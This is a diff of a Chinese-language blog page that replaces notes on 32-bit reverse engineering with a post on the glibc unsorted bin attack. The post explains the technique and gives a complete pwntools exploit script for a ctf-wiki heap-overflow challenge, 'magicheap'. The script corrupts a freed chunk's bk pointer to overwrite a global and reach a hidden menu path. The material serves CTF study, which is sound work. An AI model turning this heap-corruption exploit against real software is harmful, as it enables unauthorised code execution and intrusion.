@@ -4,12 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="32位逆向分析技术, 时钟">
-    <meta name="description" content="汇编指令
-ret n : 在ret指令后给栈指针加上操作数
-test eax,eax 如果eax的值为0，那么逻辑与的运算结果为0，设置ZF为1，否则ZF为0 
-lea ：加载有效地址
-sar : 有符号数右位移指令，这个是算术右位移，补全">
+    <meta name="keywords" content="glibc heap unsorted bin attack, 时钟">
+    <meta name="description" content="unsorted bin 基本简介：    1.它是一种双向链表的形式， 采用FILO的遍历形式。    2.我们知道malloc的时候最先寻找fastbin, 但是当fastbin里面没有合适的chunk的时候，它会去寻找small bi">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +13,7 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>32位逆向分析技术 | 时钟</title>
+    <title>glibc heap unsorted bin attack | 时钟</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -243,13 +239,13 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        32位逆向分析技术
+                        glibc heap unsorted bin attack
                     </div>
                 </div>
             </div>
@@ -360,8 +356,8 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/reverse/" target="_blank">
-                                <span class="chip bg-color">reverse</span>
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
                     </div>
@@ -372,8 +368,8 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/加密与解密/" class="post-category" target="_blank">
-                                加密与解密
+                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
+                                漏洞利用
                             </a>
                         
                     </div>
@@ -384,21 +380,21 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-09-17
+                    2020-01-30
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.1k
+                        644
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        3 分
                     </div>
                     
                 
@@ -414,67 +410,98 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><ul>
-<li>ret n : 在ret指令后给栈指针加上操作数</li>
-<li>test eax,eax 如果eax的值为0，那么逻辑与的运算结果为0，设置ZF为1，否则ZF为0 </li>
-<li>lea ：加载有效地址</li>
-<li>sar : 有符号数右位移指令，这个是算术右位移，补全时用的最高位</li>
-<li>shr : 无符号数右位移指令，这个是逻辑右位移，补全时用0</li>
-<li>shl : 左位移指令，操作数的最高位进入标志位CF,最低位补零</li>
-<li>cdq ：这个一般就是用在除法之前，然后作用就是把32位数字扩展成为64位数字，方法就是把eax的最高位全复制到edx中的每一位，进而形成一个64位数据</li>
-</ul>
-<h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>局部变量</strong></p>
-<ol>
-<li>利用栈存放局部变量， 寻找变量：[ebp-xxx]  ，参数调用： [ebp+xxx] ，编译器也可以用 “push reg” 取代指令 “sub esp ,4” 来节省几个字节的空间，”pop ecx”之类的指令也有压缩栈空间的作用，另外局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据。</li>
-<li>还可以利用寄存器来存放局部变量，除了栈占用的2个寄存器，编译器会利用剩下的6个通用寄存器尽可能有效的存放局部变量。</li>
-</ol>
-<p><strong>全局变量</strong></p>
+                <p>unsorted bin 基本简介：<br>    1.它是一种双向链表的形式， 采用FILO的遍历形式。<br>    2.我们知道malloc的时候最先寻找fastbin, 但是当fastbin里面没有合适的chunk的时候，它会去寻找small bin 如果还是没有的话，就会尝试从unsorted bin里面去寻找chunk。</p>
+<p>相关源码解释：</p>
+<pre class=" language-C"><code class="language-C">  /* remove from unsorted list */
+          if (__glibc_unlikely (bck->fd != victim))
+            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
+          unsorted_chunks (av)->bk = bck;
+          bck->fd = unsorted_chunks (av); 
+</code></pre>
+<p>通过上面的bck-&gt;fd = unsorted_chunks (av);我们可以知道， 如果把一个unsorted bin被取出来的话 ， 会将bck-&gt;fd 的位置的内容写入到本unsorted bin的位置 ，那么我们就需要控制bk的值 ， 来实现任意地址写，其实原理有点类似于unlink操作，但是由于最后的目标地址会被写成main_arean里面的内容，所以任意写的值我们无法控制。<br>这其实就是把一个unsorted chunk从链表里拿出来的时候，把fd部分写成了链表里面的unsorted bin 的值。</p>
 <ul>
-<li>全局变量通常位于.data段，程序访问全局变量一般会用一个固定的硬编码的地址进行寻址，如果放到了只读段则说明它是一个常量。</li>
+<li>victim = unsorted_chunks(av)-&gt;bk=p</li>
+<li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li>
+<li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li>
+<li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li>
 </ul>
-<p><strong>结构体和数组</strong></p>
-<ul>
-<li>其寻址方式一般是[基地址+n] 例如：mov eax, [407030h(基地址) + eax(偏移)]</li>
-</ul>
-<p><strong>虚函数</strong></p>
-<ul>
-<li>待学</li>
-</ul>
-<p><strong>控制语句</strong></p>
-<ul>
-<li>switch case : 跟if else 语句类似，但是如果case 的取值表示一个算术级数，那么编译器会利用一个跳转表来实现。此时jmp dword ptr [4*eax + 004010b0] 指令相当于switch(a) ，根据eax的值进行索引</li>
-</ul>
-<p><strong>转移指令</strong></p>
-<ul>
-<li>短转移：有条件和无条件跳转机器码均为2字节，转移的范围是-128-127字节</li>
-<li>长转移：有条件转移6字节，两字节表示转移类型（je,jg,jns）,四字节表示转移偏移量。无条件转移5字节，因为jmp只需要一个字节，四字节表示偏移即可</li>
-<li>子程序调用(call) : 一类是平常的，类似长转移，一种是调用的参数涉及寄存器，栈等值。例如：”call dword ptr [eax+2]”</li>
-<li>位移量 = 目的地址 - 起始地址 - 跳转指令本身的长度</li>
-</ul>
-<h4 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h4><ul>
-<li>整数加减法:<br>一般情况下就是add sub这些，但是因为编译优化的存在，这些明显的指令会被替换，lea指令允许用户在一个时钟内完成c = a + b + 78h的计算，其中a b c都是在有寄存器的情况下有效，会编译成lea c,[a+b+78h],这种技巧可以使多个变量的求和在一个指令周期内完成，同时可以通过任何寄存器返回结果。例如： lea eax,[eax+ecx+78h] （78h不是固定的,只是表明可以是立即数）</li>
-<li>整数乘法<br>这一般就是mul和imul了，但是优化会进行改变，如果乘2的次幂较大可能用shl左移指令，同时也可能会用lea指令，类似于上面的加法。</li>
-<li>整数的除法<br>这个一般是div,idiv,除法代价高，大概需要比乘法运算多消耗十倍的CPU时钟，这个的替换类似于乘法，也是当除数是2的幂 的话，无符号尽量用shr,有符号尽量用sar，同时优化的时候尽量会把除法替换成乘法一般就是倒数相乘a/b=a*(1/b)</li>
-</ul>
-<h4 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h4><ul>
-<li>字符串大小写转换:<br>大写字母 41h - 5Ah 小写字母 61h - 7Ah 它们之间的转换方式就是原来ASCII的值+/- 20h<br>还有一种大小写转化方法是基于位操作，我们可以发现二进制表示的时候大写字母A的第五位是0，而小写a的第五位是1，其他可以类推，所以就有以下方式<pre><code>Main    proc near
-         lea bx, title+!
-         mov cx,31
-B20:
-          mov ah,[bx]
-          cmp ah,61h
-          jb B30
-          cmp ah,7Ah
-          ja B30
-          and ah ,1101 1111b  ;and 将ah的第五位指令置0(11011111b = DFh)
-          mov [bx],ah
-B30:
-          inc bx
-          loop B20
-          ret
-Main    endp
-</code></pre></li>
-</ul>
+<p>这样的话就可以实现上述功能。</p>
+<p>ctf-wiki里面有一个题目，说明了unsorted bin attack的功能之一，题目很简单，首先是一个堆溢出，然后我们就可以修改unsorted bin attack的bk，然后把magic处修改为一个很大的值，实现利用。</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+exec_binary <span class="token operator">=</span> <span class="token string">"./magicheap"</span>
+libcversion <span class="token operator">=</span> <span class="token string">'2.23'</span>
+local <span class="token operator">=</span> <span class="token number">1</span>
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binary
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> local<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>
+        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>
+        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libcbase
+    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>
+    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span> 
+
+<span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd<span class="token operator">+</span>r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span>r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    text_base<span class="token punctuation">,</span>libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token operator">+</span><span class="token string">"set $libc_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>
+    break_point<span class="token operator">+=</span><span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>contexe<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap:"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>contexe<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap : "</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context<span class="token punctuation">)</span>
+
+malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>
+free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000006020C0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4869"</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+</code></pre>
 
             </div>
             <hr>
@@ -506,9 +533,9 @@ Main    endp
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《32位逆向分析技术》
+                    《glibc heap unsorted bin attack》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/01/30/glibc-heap-unsorted-bin-attack/" property="cc:attributionName" rel="cc:attributionURL">
                 时钟
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -549,27 +576,80 @@ Main    endp
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/11/05/2019i-chun-qiu-da-ti-sai/">
+                <a href="/2020/01/30/glibc-heap-unsorted-bin-attack/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="2019I春秋答题赛">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="glibc heap unsorted bin attack">
                         
-                        <span class="card-title">2019I春秋答题赛</span>
+                        <span class="card-title">glibc heap unsorted bin attack</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            PWN2做出来了两个pwn题目（其中一个是复现出来的。。。。）：首先说一个pwn2，这个题目真是让我张了不少知识，不仅理解了tcache和unsorted bin attack还学会怎么patch elf文件的libc和ld链接器，同时学了
+                            unsorted bin 基本简介：    1.它是一种双向链表的形式， 采用FILO的遍历形式。    2.我们知道malloc的时候最先寻找fastbin, 但是当fastbin里面没有合适的chunk的时候，它会去寻找small bi
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-05
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
+                                    漏洞利用
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/01/30/buu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="buu">
+                        
+                        <span class="card-title">buu</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            babyheap_0ctf_2017这个题目保护全开，我们分析一下它的数据结构：
+
+可以看出，在一个程序分配出的地址上，存储了堆块是否被使用的flag,和堆块的size和堆块的内存指针，同时值得注意的是calloc，它和malloc有所不同
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -587,59 +667,6 @@ Main    endp
                     
                     <a href="/tags/pwn/" target="_blank">
                         <span class="chip bg-color">pwn</span>
-                    </a>
-                    
-                    <a href="/tags/reverse/" target="_blank">
-                        <span class="chip bg-color">reverse</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/09/17/hui-bian-zhi-shi-dian/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="汇编知识点">
-                        
-                        <span class="card-title">汇编知识点</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            汇编中补码转换1.补码可以先减1，然后按位取反。2.从右往左遇见第一个1不变，然后向左按位取反（符号位除外）3.对于16进制数 ：取反的方法就是用15减去改数字中的每一位 ：6A3D –&gt; 95C2+1 –&gt; 95C3 （这只是
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-17
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/编程语言/" class="post-category" target="_blank">
-                                    编程语言
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/汇编语言/" target="_blank">
-                        <span class="chip bg-color">汇编语言</span>
                     </a>
                     
                 </div>
